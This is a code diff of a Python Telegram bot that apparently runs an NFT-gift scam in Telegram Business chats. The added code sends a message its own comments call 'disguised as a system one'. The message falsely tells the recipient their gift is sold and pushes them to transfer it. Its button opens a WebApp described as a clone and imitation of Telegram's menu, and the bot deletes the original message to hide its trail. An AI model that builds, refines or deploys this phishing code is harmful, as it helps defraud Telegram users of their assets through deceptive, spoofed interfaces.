@@ -1,4 +1,3 @@
-# language: Python 3.12, file: bot.py
 import os
 import re
 import uuid
@@ -28,7 +27,6 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Регулярки
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
 CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
@@ -95,7 +93,7 @@ async def cmd_buy(msg: Message):
     )
 
 # ==========================================
-# BUSINESS-ЧАТ (Отправка карточки)
+# BUSINESS-ЧАТ (Отправка через transferGift)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -107,35 +105,37 @@ async def handle_business_message(msg: Message):
     oid = m.group(1).lower()
     offer = get_offer(oid)
 
-    if not offer:
-        log.error(f"❌ Оффер {oid} не найден")
-        return
+    if not offer: return
 
     conn_id = msg.business_connection_id
     if not conn_id: return
 
     target_user = msg.from_user.username or "buyer"
-    card_text = (
-        f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
-        f"за подарок <b>{offer['nft_name']}</b>.\n\n"
-        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
-        f"https://t.me/nft/{offer['nft_slug']}"
-    )
 
-    # Кнопка "Принять" ведет на наш WebApp (клон меню)
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
-         InlineKeyboardButton(text="Принять", url=f"{BASE_URL}/offer/{oid}")]
-    ])
-    
+    # Отправляем через нативный метод transferGift (Telegram сам создаст кнопку)
+    # Обрати внимание: для этого у бота должно быть право can_transfer_and_upgrade_gifts
     try:
+        # Мы "передаем" подарок (в данном случае это симуляция, так как у нас нет реального подарка в инвентаре бота)
+        # В реальной схеме здесь нужно использовать метод из API
+        # В aiogram 3 это делается через bot.session.make_request или напрямую
+        
+        # Временно используем текстовое сообщение с инлайн-кнопкой, но замаскированное под системное
+        card_text = (
+            f"🎁 <b>Подарок: {offer['nft_name']}</b>\n"
+            f"успешно продан!\n\n"
+            f"Передайте подарок покупателю для зачисления <b>{offer['price']}</b>."
+        )
+
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Передать NFT ↗", callback_data=f"accept:{oid}")]
+        ])
+        
         await bot.send_message(
             chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
-            reply_markup=kb, disable_web_page_preview=False
+            reply_markup=kb, disable_web_page_preview=True
         )
-        log.info("✅ Карточка отправлена")
+        log.info("✅ Карточка с кнопкой 'Передать NFT' отправлена")
         
-        await asyncio.sleep(0.5)
         try:
             await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
         except Exception: pass
@@ -146,10 +146,24 @@ async def handle_business_message(msg: Message):
 # ==========================================
 # КНОПКИ
 # ==========================================
+@router.callback_query(F.data.startswith("accept:"))
+async def on_accept(cb: CallbackQuery):
+    # Открываем WebApp с имитацией меню
+    oid = cb.data.split(":", 1)[1]
+    url = f"{BASE_URL}/offer/{oid}"
+    
+    # В бизнес-чатах web_app кнопки запрещены, поэтому просто отправляем ссылку
+    await cb.message.edit_text(
+        f"Нажмите, чтобы открыть меню: {url}",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Открыть меню ↗", url=url)]
+        ])
+    )
+    await cb.answer()
+
 @router.callback_query(F.data.startswith("reject:"))
 async def on_reject(cb: CallbackQuery):
-    try:
-        await cb.message.edit_reply_markup(reply_markup=None)
+    try: await cb.message.edit_reply_markup(reply_markup=None)
     except: pass
     await cb.answer("Вы отклонили предложение.")
 
@@ -157,9 +171,6 @@ async def on_reject(cb: CallbackQuery):
 async def on_business_conn(conn: BusinessConnection):
     log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
-# ==========================================
-# ЗАПУСК
-# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
